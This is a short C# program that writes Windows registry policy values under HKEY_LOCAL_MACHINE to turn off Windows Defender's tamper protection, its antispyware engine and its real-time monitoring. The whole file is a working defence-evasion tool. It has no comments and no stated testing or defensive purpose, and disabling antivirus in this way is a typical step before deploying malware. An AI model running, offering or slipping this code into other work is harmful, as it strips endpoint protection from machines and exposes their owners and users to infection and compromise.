using System;
using Microsoft.Win32;

namespace writeregkeys
{
    class Program
    {
        static void Main()
        {
            RegistryKey RegKeyWrite1 = Registry.LocalMachine;
            RegKeyWrite1 = RegKeyWrite1.CreateSubKey("Software\\Policies\\Microsoft\\Windows Defender\\Features");
            RegKeyWrite1.SetValue("TamperProtection",0);
            RegKeyWrite1.Close();

            RegistryKey RegKeyWrite2 = Registry.LocalMachine;
            RegKeyWrite2 = RegKeyWrite2.CreateSubKey("Software\\Policies\\Microsoft\\Windows Defender");
            RegKeyWrite2.SetValue("DisableAntiSpyware",1);
            RegKeyWrite2.Close();

            RegistryKey RegKeyWrite3 = Registry.LocalMachine;
            RegKeyWrite3 = RegKeyWrite3.CreateSubKey("Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
            RegKeyWrite3.SetValue("DisableRealtimeMonitoring",1);
            RegKeyWrite3.Close();

        }
    }
}
